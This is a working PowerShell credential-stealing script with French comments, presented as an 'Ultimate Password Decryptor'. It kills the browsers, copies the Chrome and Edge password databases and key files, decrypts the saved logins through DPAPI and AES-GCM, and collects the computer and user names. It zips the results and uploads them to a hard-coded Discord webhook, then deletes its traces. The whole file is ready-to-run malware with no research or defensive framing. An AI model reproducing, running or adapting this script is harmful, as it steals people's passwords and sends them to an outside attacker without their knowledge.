# Ultimate Password Decryptor - FIXED PATHS
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

# Kill browsers
taskkill /F /IM chrome.exe,msedge.exe,firefox.exe 2>$null
Start-Sleep -Seconds 2

# Setup
cd $env:TEMP
Remove-Item Loot -Recurse -Force -EA 0
mkdir Loot -Force | Out-Null

# Chemins corrects
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
$chromeRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
$edgeRoot = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"

# Copier Chrome
if (Test-Path "$chromePath\Login Data") {
    Copy-Item "$chromePath\Login Data" "Loot\Chrome_Passwords.db" -EA 0
}
if (Test-Path "$chromeRoot\Local State") {
    Copy-Item "$chromeRoot\Local State" "Loot\Chrome_Local_State" -EA 0
}

# Copier Edge
if (Test-Path "$edgePath\Login Data") {
    Copy-Item "$edgePath\Login Data" "Loot\Edge_Passwords.db" -EA 0
}
if (Test-Path "$edgeRoot\Local State") {
    Copy-Item "$edgeRoot\Local State" "Loot\Edge_Local_State" -EA 0
}

# Vérifier si les fichiers existent
$chromeLocalStateExists = Test-Path "Loot\Chrome_Local_State"
$edgeLocalStateExists = Test-Path "Loot\Edge_Local_State"

"Chrome Local State: $chromeLocalStateExists" | Out-File "Loot\debug.txt"
"Edge Local State: $edgeLocalStateExists" | Out-File "Loot\debug.txt" -Append

# Fonction pour obtenir la clé de chiffrement AES
function Get-EncryptionKey {
    param([string]$localStatePath)
    
    if (!(Test-Path $localStatePath)) {
        return $null
    }
    
    try {
        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
        $encryptedKey = $localState.os_crypt.encrypted_key
        $encryptedKeyBytes = [Convert]::FromBase64String($encryptedKey)
        
        # Enlever le préfixe "DPAPI" (5 premiers bytes)
        $encryptedKeyBytes = $encryptedKeyBytes[5..($encryptedKeyBytes.Length - 1)]
        
        # Déchiffrer avec DPAPI
        Add-Type -AssemblyName System.Security
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $encryptedKeyBytes,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        
        return $key
    } catch {
        return $null
    }
}

# Fonction de déchiffrement
function Decrypt-ChromePassword {
    param(
        [byte[]]$encryptedData,
        [byte[]]$key
    )
    
    try {
        # Vérifier le format (v10/v11 = AES-GCM)
        if ($encryptedData.Length -lt 15) {
            return $null
        }
        
        if ($encryptedData[0] -eq 118 -and $encryptedData[1] -eq 49 -and $encryptedData[2] -eq 48) {
            # Format v10 = AES-GCM
            $nonce = $encryptedData[3..14]
            $ciphertext = $encryptedData[15..($encryptedData.Length - 17)]
            $tag = $encryptedData[($encryptedData.Length - 16)..($encryptedData.Length - 1)]
            
            # Déchiffrement AES-GCM (nécessite .NET Core 3.0+)
            try {
                $aes = [System.Security.Cryptography.AesGcm]::new($key)
                $plaintext = New-Object byte[] $ciphertext.Length
                $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
                return [System.Text.Encoding]::UTF8.GetString($plaintext)
            } catch {
                # Si AesGcm n'est pas disponible, on passe
                return $null
            }
        } else {
            # Ancien format DPAPI
            Add-Type -AssemblyName System.Security
            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
                $encryptedData,
                $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
            )
            return [System.Text.Encoding]::UTF8.GetString($decrypted)
        }
    } catch {
        return $null
    }
}

# Fonction principale de déchiffrement
function Decrypt-Passwords {
    param(
        [string]$dbPath,
        [string]$localStatePath,
        [string]$browser
    )
    
    $results = @()
    $results += "===== $browser PASSWORDS =====`n`n"
    
    if (!(Test-Path $dbPath)) {
        $results += "ERROR: Database not found at $dbPath`n"
        return $results
    }
    
    # Obtenir la clé
    $key = Get-EncryptionKey $localStatePath
    
    if ($null -eq $key) {
        $results += "WARNING: Could not get encryption key, trying DPAPI only...`n`n"
    }
    
    # Télécharger SQLite
    $sqliteDll = "$env:TEMP\System.Data.SQLite.dll"
    if (!(Test-Path $sqliteDll)) {
        try {
            [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
            $url = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"
            irm $url -OutFile "$env:TEMP\sqlite.zip" -UseBasicParsing
            Expand-Archive "$env:TEMP\sqlite.zip" -DestinationPath $env:TEMP -Force
            Remove-Item "$env:TEMP\sqlite.zip"
        } catch {
            $results += "ERROR downloading SQLite: $($_.Exception.Message)`n"
            return $results
        }
    }
    
    try {
        Add-Type -Path $sqliteDll
        
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$dbPath")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''"
        $reader = $cmd.ExecuteReader()
        
        $count = 0
        $failed = 0
        
        while ($reader.Read()) {
            try {
                $url = $reader["origin_url"]
                $user = $reader["username_value"]
                $encPwd = [byte[]]$reader["password_value"]
                
                if ($encPwd.Length -gt 0) {
                    $password = $null
                    
                    if ($null -ne $key) {
                        $password = Decrypt-ChromePassword $encPwd $key
                    } else {
                        # Essayer DPAPI direct
                        try {
                            Add-Type -AssemblyName System.Security
                            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPwd, $null, 'CurrentUser')
                            $password = [Text.Encoding]::UTF8.GetString($decrypted)
                        } catch {}
                    }
                    
                    if ($null -ne $password -and $password.Length -gt 0) {
                        $results += "URL: $url`n"
                        $results += "Username: $user`n"
                        $results += "Password: $password`n"
                        $results += "---`n`n"
                        $count++
                    } else {
                        $failed++
                    }
                }
            } catch {
                $failed++
            }
        }
        
        $conn.Close()
        $results += "`nDecrypted: $count passwords`n"
        $results += "Failed: $failed passwords`n`n"
    } catch {
        $results += "ERROR: $($_.Exception.Message)`n"
    }
    
    return $results
}

# Déchiffrer Chrome
if (Test-Path "Loot\Chrome_Passwords.db") {
    $chromeResults = Decrypt-Passwords "Loot\Chrome_Passwords.db" "Loot\Chrome_Local_State" "CHROME"
    $chromeResults | Out-File "Loot\CHROME_PASSWORDS.txt"
}

# Déchiffrer Edge
if (Test-Path "Loot\Edge_Passwords.db") {
    $edgeResults = Decrypt-Passwords "Loot\Edge_Passwords.db" "Loot\Edge_Local_State" "EDGE"
    $edgeResults | Out-File "Loot\EDGE_PASSWORDS.txt"
}

# System info
@"
COMPUTER: $env:COMPUTERNAME
USER: $env:USERNAME
DATE: $(Get-Date)
Chrome Local State: $(Test-Path "Loot\Chrome_Local_State")
Edge Local State: $(Test-Path "Loot\Edge_Local_State")
"@ | Out-File "Loot\SYSTEM_INFO.txt"

# Compresser
Compress-Archive -Path "Loot\*" -DestinationPath "loot.zip" -Force

# Upload
curl.exe -F "file=@loot.zip" -F "content=**Loot from $env:COMPUTERNAME**" $wh

# Cleanup
Start-Sleep -Seconds 3
Remove-Item "loot.zip","Loot" -Recurse -Force -EA 0
